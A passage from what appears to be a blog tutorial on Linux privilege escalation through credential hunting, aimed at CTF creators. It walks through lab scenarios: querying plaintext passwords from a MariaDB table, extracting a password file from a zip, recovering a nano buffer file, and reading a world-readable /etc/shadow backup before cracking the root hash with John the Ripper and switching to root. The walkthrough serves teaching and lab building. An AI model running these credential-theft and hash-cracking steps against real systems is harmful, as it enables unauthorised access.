<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">employee_id</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">user_type</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">                    </span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SUPER ADMIN&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;pass123&#39;</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">                    </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;NORMAL&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;pass321&#39;</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">                    </span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ADMIN&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hello&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">003</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Records</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="w">  </span><span class="n">Duplicates</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">  </span><span class="n">Warnings</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>As the adversary, we can log in to MySQL with:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ mysql -u user -p
</span></span><span class="line"><span class="cl">Enter password: 
</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">36</span>
</span></span><span class="line"><span class="cl">Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we could perform an SQL query of the columns username, and password from the users&rsquo; table:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">USE</span><span class="w"> </span><span class="n">test</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Reading</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">completion</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="k">names</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">we</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">turn</span><span class="w"> </span><span class="k">off</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">feature</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">quicker</span><span class="w"> </span><span class="n">startup</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="w"> </span><span class="n">changed</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+----------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+----------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">pass123</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">user</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">pass321</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">user</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">hello</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+----------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>We can see some usernames and passwords so we can use these credentials to try to escalate privileges on the system. In modern databases, we may see the passwords hashed using some strong hashing algorithms.</p>
<h1 id="privilege-escalation-via-compressed-files--archives">Privilege Escalation via Compressed Files / Archives</h1>
<p>Sensitive information might be stored in compressed files like <code>.zip, .tar, .tar.gz</code> and so on. These compressed files may contain credentials as well.</p>
<h3 id="compressed-file-scenario">Compressed File Scenario</h3>
<p>Create a zip file using the file that we created in the  <a href="#plain-text-file-scenario" rel="">Plaintext File Scenario</a>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ zip password.zip /home/user/Desktop/password.txt 
</span></span><span class="line"><span class="cl">  adding: home/user/Desktop/password.txt <span class="o">(</span>deflated 15%<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From an adversary&rsquo;s perspective, we can try to decompress the file and examine its contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ unzip password.zip -d /tmp
</span></span><span class="line"><span class="cl">Archive:  password.zip
</span></span><span class="line"><span class="cl">  inflating: /tmp/home/user/Desktop/password.txt  
</span></span></code></pre></td></tr></table>
</div>
</div><p>Read the file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /tmp/home/user/Desktop/password.txt
</span></span><span class="line"><span class="cl">Passwords:
</span></span><span class="line"><span class="cl">	The user password is: pass321
</span></span></code></pre></td></tr></table>
</div>
</div><p>This was a really simple example but hey it is what it is. We could attempt to try a password re-use technique and find valid credentials.</p>
<h1 id="privilege-escalation-via-buffer-files">Privilege Escalation via Buffer Files</h1>
<p>Some text editors like <code>nano</code> will try to dump the buffer into an emergency file. In the case of the nano text editor, this will happen when it receives a <code>SIGHUP</code> or <code>SIGTERM</code> signal or when it simply runs out of memory. The buffer will be written to a file called <code>nano.save</code> if the buffer does not already have a filename otherwise if it has a filename then it will append a &ldquo;.save&rdquo; suffix to the current filename. For more information about this we can try to read the <a href="https://www.nano-editor.org/dist/v2.2/nano.1.html#NOTES" target="_blank" rel="noopener noreffer ">documentation</a>.</p>
<p>Imagine that this buffer file was a PHP configuration file for a database connection or something similar. Well if that is the case we may find credentials in the buffer file.</p>
<h3 id="nano-scenario">Nano Scenario</h3>
<p>Let&rsquo;s attempt to edit the <code>config.php</code> file that we created in the previous section:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nano config.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>Open another terminal window, tab, or pane and now let&rsquo;s send a <code>SIGTERM</code> signal by using the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pkill nano
</span></span></code></pre></td></tr></table>
</div>
</div><p>After killing the nano process we will see this output in the terminal window, tab, or pane that nano was open:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ nano config.php
</span></span><span class="line"><span class="cl">Received SIGHUP or SIGTERM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Buffer written to config.php.save
</span></span></code></pre></td></tr></table>
</div>
</div><p>As the adversary, we can just read the file and gather the credentials:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat config.php.save
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="privilege-escalation-via-backup-files">Privilege Escalation via Backup Files</h1>
<p>It is very common to see backups of files that do contain credentials. Backups often have this naming convention <code>filename.bak</code>  ending with <code>.bak</code>, however, we may also extensions such as the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">.bak
</span></span><span class="line"><span class="cl">.ext <span class="c1"># &lt;-- extension like .sh, .php, .pl, .py, .zip</span>
</span></span><span class="line"><span class="cl">.bak.ext
</span></span><span class="line"><span class="cl">.backup
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="sensitive-file-etcshadow-backup-scenario">Sensitive File /etc/shadow Backup Scenario</h3>
<p>Let&rsquo;s create a backup of the <code>/etc/shadow</code> file, we shall never do the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo cp /etc/shadow /tmp/shadow.bak <span class="o">&amp;&amp;</span> sudo chmod o+r /tmp/shadow.bak
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is a Linux-sensitive file, this file contains the user password hashes and is now readable by other users and groups. As the adversary, we could attempt to crack the hashes of these users:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /tmp/shadow.bak
</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxx</span>:18982:0:99999:7:::
</span></span><span class="line"><span class="cl">daemon:*:18858:0:99999:7:::
</span></span><span class="line"><span class="cl">bin:*:18858:0:99999:7:::
</span></span><span class="line"><span class="cl">sys:*:18858:0:99999:7:::
</span></span><span class="line"><span class="cl">sync:*:18858:0:99999:7:::
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can copy this hash and save it in a file called <code>hash.txt</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s1">&#39;$6$xxxxxxxxxxxxxxxxxxxxxxx&#39;</span> &gt; hash.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>We could then try to crack the hash to recover the password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see below, the password has been cracked:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ john hash.txt --show
</span></span><span class="line"><span class="cl">?:pass123
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">1</span> password <span class="nb">hash</span> cracked, <span class="m">0</span> left
</span></span></code></pre></td></tr></table>
</div>
</div><p>Once we have cracked the root user password we can switch to the root user:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">su root
</span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-12-28</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/credential-hunting/">Credential Hunting</a>,&nbsp;<a href="/tags/plaintext/">Plaintext</a>,&nbsp;<a href="/tags/cleartext/">Cleartext</a>,&nbsp;<a href="/tags/smtp/">Smtp</a>,&nbsp;<a href="/tags/postfix/">Postfix</a>,&nbsp;<a href="/tags/opasswd/">Opasswd</a>,&nbsp;<a href="/tags/mysql/">Mysql</a>,&nbsp;<a href="/tags/configuration-files/">Configuration Files</a>,&nbsp;<a href="/tags/pcapng/">Pcapng</a>,&nbsp;<a href="/tags/john/">John</a>,&nbsp;<a href="/tags/history/">History</a>,&nbsp;<a href="/tags/sshpass/">Sshpass</a>,&nbsp;<a href="/tags/telnet/">Telnet</a>,&nbsp;<a href="/tags/netcat/">Netcat</a>,&nbsp;<a href="/tags/swaks/">Swaks</a>,&nbsp;<a href="/tags/scp/">Scp</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/linux-privesc-capabilities/" class="next" rel="next" title="Linux Privilege Escalation - Capabilities  for CTF Creators">Linux Privilege Escalation - Capabilities  for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
